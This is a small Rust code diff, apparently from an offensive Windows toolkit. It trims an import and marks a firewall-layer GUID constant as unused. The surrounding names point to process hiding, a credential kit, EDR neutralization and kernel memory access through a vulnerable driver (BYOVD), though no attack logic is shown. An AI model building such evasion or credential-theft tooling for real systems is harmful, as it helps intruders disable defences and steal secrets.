@@ -20,7 +20,7 @@ use crate::persistence::ProcessHider;
 use crate::{CredKit, EdrNeutralizeKit, KernelRw, KitError, NeutralizeMethod, WfpKit};
 use alloc::vec::Vec;
 #[cfg(target_os = "windows")]
-use alloc::{format, vec};
+use alloc::format;
 
 /// Adapter: read physical memory via a `KernelRw` (which reads physical
 /// addresses directly through the BYOVD driver). Implements `PhysRead` so
@@ -304,6 +304,7 @@ struct FwpmFilter0 {
 /// The GUID for FWPM_LAYER_ALE_AUTH_CONNECT_V4 (outbound connection, IPv4).
 /// {E1CD9FE7-F6B4-426B-8E3B-44BDCF26F5A1}
 #[cfg(target_os = "windows")]
+#[allow(dead_code)] // WFP layer GUID — reserved for future netsec filter registration
 const LAYER_ALE_AUTH_CONNECT_V4: [u8; 16] = [
     0xE1, 0xCD, 0x9F, 0xE7, 0xF6, 0xB4, 0x42, 0x6B, 0x8E, 0x3B, 0x44, 0xBD, 0xCF, 0x26, 0xF5, 0xA1,
 ];
